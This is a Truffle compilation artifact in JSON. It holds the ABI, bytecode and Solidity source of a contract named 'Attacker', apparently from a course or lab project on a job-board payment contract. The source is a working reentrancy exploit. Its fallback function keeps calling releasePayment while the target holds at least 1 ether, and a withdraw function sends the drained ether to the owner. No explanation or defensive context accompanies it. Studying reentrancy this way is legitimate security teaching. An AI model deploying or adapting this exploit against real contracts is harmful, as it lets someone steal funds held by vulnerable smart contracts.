{
  "contractName": "Attacker",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "targetJobId",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0x49153173"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0x8da5cb5b"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "jobBoard",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0xeab0ba68"
    },
    {
      "inputs": [
        {
          "name": "_jobBoardAddress",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor",
      "signature": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_jobId",
          "type": "uint256"
        }
      ],
      "name": "setTargetJob",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0xd91b6b33"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0x9e5faafc"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0x3ccfd60b"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function",
      "signature": "0x12065fe0"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806106528339810180604052602081101561003057600080fd5b8101908080519060200190929190505050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610580806100d26000396000f3fe608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe01461017b5780633ccfd60b146101a657806349153173146101bd5780638da5cb5b146101e85780639e5faafc1461023f578063d91b6b3314610256578063eab0ba6814610291575b670de0b6b3a7640000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110151561017957600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166388685cd96002546040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561016057600080fd5b505af1158015610174573d6000803e3d6000fd5b505050505b005b34801561018757600080fd5b506101906102e8565b6040518082815260200191505060405180910390f35b3480156101b257600080fd5b506101bb610307565b005b3480156101c957600080fd5b506101d261044c565b6040518082815260200191505060405180910390f35b3480156101f457600080fd5b506101fd610452565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561024b57600080fd5b50610254610477565b005b34801561026257600080fd5b5061028f6004803603602081101561027957600080fd5b8101908080359060200190929190505050610524565b005b34801561029d57600080fd5b506102a661052e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103cb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260098152602001807f4e6f74206f776e6572000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610449573d6000803e3d6000fd5b50565b60025481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166388685cd96002546040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561050a57600080fd5b505af115801561051e573d6000803e3d6000fd5b50505050565b8060028190555050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea165627a7a72305820a96825f5d5bd74693ffa394acd22bed7ffd87a9cde64b0de5709e3796d398e430029",
  "source": "pragma solidity ^0.5.0;\r\n\r\ninterface IJobBoard {\r\n    function releasePayment(uint256 jobId) external;\r\n}\r\n\r\ncontract Attacker {\r\n    address payable public owner;\r\n    IJobBoard public jobBoard;\r\n    uint256 public targetJobId;\r\n\r\n    constructor(address _jobBoardAddress) public {\r\n        owner = msg.sender;\r\n        jobBoard = IJobBoard(_jobBoardAddress);\r\n    }\r\n\r\n    // Set which job to attack\r\n    function setTargetJob(uint256 _jobId) public {\r\n        targetJobId = _jobId;\r\n    }\r\n\r\n    // Fallback function gets triggered when receiving ETH\r\n    function() external payable {\r\n        if (address(jobBoard).balance >= 1 ether) {\r\n            // Try to reenter\r\n            jobBoard.releasePayment(targetJobId);\r\n        }\r\n    }\r\n\r\n    function attack() public {\r\n        jobBoard.releasePayment(targetJobId);\r\n    }\r\n\r\n    function withdraw() public {\r\n        require(msg.sender == owner, \"Not owner\");\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    // Helper to check balance\r\n    function getBalance() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n}\r\n",
  "sourcePath": "C:/Users/ark_1/Downloads/eth-todo-list-20250417T174138Z-001/eth-todo-list/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.0.1",
  "updatedAt": "2025-04-26T09:35:39.326Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}